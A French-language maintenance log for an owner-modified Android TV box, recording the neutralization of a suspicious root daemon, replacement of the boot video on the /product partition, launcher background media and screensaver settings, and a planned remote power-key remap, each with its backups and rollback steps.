| Élément | État |
|---|---|
| Démon root `gsdnode_android` | **Neutralisé** (script factice), persiste après redémarrage |
| Store, app de pub, OTA, réinstalleur, updater de launcher | **Désactivés** |
| Launcher du fabricant | **Désactivé**, remplacé par CleanYourTV (sans réseau) |
| Connexions sortantes | Google et Amazon (Prime Video) uniquement |
| ADB réseau sans authentification, `su`, SELinux permissif | **Toujours là** (build `userdebug`) |
| Apps de test `stresstest`, `changeled` | Toujours en mémoire (persistantes), aucune connexion observée |
| Firmware | Toujours le firmware d'origine, falsifié, non mis à jour |
| Reset d'usine | **À éviter** : il ferait revenir le vrai démon |


### 10.8 Personnalisation du démarrage et de l'accueil (02/11/2026, soir)

**Vidéo de démarrage remplacée (modification de la partition système `/product`)**
- La box lit sa vidéo de démarrage dans `/product/media/bootanimation.ts` (réglage `persist.sys.bootvideo.enable=true`). Originale : H.264 1080p25 + AAC, 9,05 s, 9 574 165 octets, MD5 `248b99e6dfb36b3e617d41fee3aba824`. **Copie conservée** : `bootvideo\stock-bootanimation.ts`.
- Remplacée par la vidéo 5HC : H.264 1080p25 + AAC, 19,14 s, 7 691 080 octets, MD5 `27dc056ee44a4153f2cfd18ce2c46000`. Source : `build\bootanimation.ts`.
- `/product` est une partition ext4 **sans vérification d'intégrité (pas de dm-verity)**, remontée en écriture le temps de l'opération puis remise en lecture seule.
- Incident : une première copie a **vidé le fichier (0 octet)** à cause de la réserve interne d'ext4 (`reserved_clusters`, 4096) qui rendait l'espace libre inutilisable. Corrigé en abaissant temporairement cette réserve à 0 pour l'écriture, puis en la remettant à 4096. Empreinte vérifiée après écriture et après redémarrage.
- **Retour arrière :** `restore\restore-bootvideo.job` (réécrit l'originale ; attendu : MD5 `248b99e6…`).
- Après un reflash ou une mise à jour du système, cette modification serait perdue.

**Médias de l'accueil (sur la box : `/sdcard/Android/data/com.gathin.tvhome/files/media/`)**
- `intro.mp4` : 19,10 s. Vidéo 5HC aller 0–10,03 s, retour accéléré (x1,21) pour un noir complet à 18,30 s, puis noir silencieux ; musique « Peaceful Contemplation » coupée à 19,10 s, en plein silence, **avant le drop qui arrive à 19,22 s**.
- `idle.mp4` : vidéo 5HC d'origine, sans son, pour l'écran de veille.
- `mine/` : `10_background_5hc_1.png`, `20_statique_1.mp4`, `30_statique_2.png`, `40_statique_3.mp4`, `50_statique_4.mp4` (vidéos converties en 1080p sans son).
- `filler/` : les 14 paysages du thème `scenes` du dépôt. Un paysage tiré au hasard après chaque passage complet de `mine/`.
- Pour ajouter des fonds plus tard : copier les fichiers dans `mine/` (ordre alphabétique des noms) ou `filler/`, sans recompiler.
- Code ajouté au launcher : `MediaBackground`, `IntroActivity`, `VideoDream` (aucune permission supplémentaire, toujours sans `INTERNET`).


### 10.9 Launcher mis à jour avec fonds, intro et veille vidéo (02/11/2026, 21:50)

- APK recompilé sur le PC : `tvhome.apk`, 591 637 octets, SHA-256 `01ce31ac5d94dc066a4ee26d4b0d26a08763540f7064c78fb91d37f4cf0b1187`. Installé par-dessus (`pm install -r`) ; **permissions inchangées** : ni `INTERNET`, ni `INSTALL_PACKAGES`, ni micro ni caméra.
- **Fond d'écran (`MediaBackground`)** : vérifié dans les journaux (la première vidéo de fond démarre exactement 30 s après l'accueil). Consommation du launcher : ~25 Mo PSS, ~9 % de CPU pendant une vidéo.
- **Intro au démarrage (`IntroActivity`)** : testée, elle dure 19,9 s puis rend l'accueil. Une seule fois par démarrage (compteur `BOOT_COUNT`). **Limite connue :** si Android renvoie un signal « accueil » à l'app pendant la lecture, l'intro est interrompue (cela s'est produit pendant un test à cause d'une commande `am start`, pas à l'usage normal).
- **Écran de veille vidéo (`VideoDream`)** : réglé via `screensaver_components`, testé en réduisant temporairement le délai à 15 s : la vidéo démarre, la veille s'arrête au réveil. Délai de veille actuel : 15 minutes (`screen_off_timeout=900000`), remis à sa valeur après le test.
- **Doublon possible :** la vidéo de démarrage système (§10.8) et l'intro du launcher jouent la même vidéo l'une après l'autre. Pour désactiver l'intro du launcher : renommer `media/intro.mp4` en `intro.mp4.off` sur la box.
- Non vérifié à distance : le rendu visuel des fonds (recadrage, lisibilité) et le son de la vidéo de démarrage.


### 10.10 Veille à 5 min, version longue, bouton éteindre (02/11/2026, 22:30)

- **Veille** : `screen_off_timeout=300000` (5 minutes). Vérifié : l'écran de veille vidéo s'est bien déclenché seul à l'échéance.
- **Version longue** (`media\library\5HC_version_longue.mp4` sur le PC ; `files/media/library/5HC_long.mp4` sur la box) : 57,25 s, musique complète « Peaceful Contemplation ». Trois cycles du logo (apparition puis disparition) : cycle 1 = celui de l'intro (noir à 18,30 s), cycles 2 et 3 reprennent au drop (19,24 s) ; le flash du dernier cycle tombe à 46,3 s sur la montée musicale ; dernière dissolution terminée ~1 s après la fin de la musique. H.264 720p24, 15,7 Mo.
- **Outro** (`files/media/outro.mp4`) : la fin de l'intro à partir de 12,0 s (7,1 s).
- **Bouton éteindre — faits établis** : la télécommande IR (`ffa90030.pwm`, appareil 4) envoie `KEYCODE_POWER` (26), scancode **116** ; Android l'intercepte avant toute app et endort la box (`mLastSleepReason=power_button`). Un service d'accessibilité ne peut pas l'intercepter. Plan : remapper le scancode 116 en `STB_POWER` avec le drapeau `WAKE` dans `/vendor/usr/keylayout/ffa90030_pwm.kl` (modification de la partition `/vendor`, même méthode que pour la vidéo de démarrage), puis laisser `InputKeyService` jouer l'outro et endormir la box (`GLOBAL_ACTION_LOCK_SCREEN`). **Sauvegarde et retour arrière prévus avant toute modification.**
- **Intro** : une touche pressée avant 11 s est mémorisée, la vidéo se coupe à 11 s (fondu de 0,3 s) ; après 11 s elle coupe tout de suite.
- **Incident d'outil** : la file de tâches a deux fois ré-exécuté une ancienne tâche à la place de la nouvelle ; cela a supprimé des fichiers de capture temporaires (sans autre effet). Les tâches suivantes portent un identifiant vérifiable.
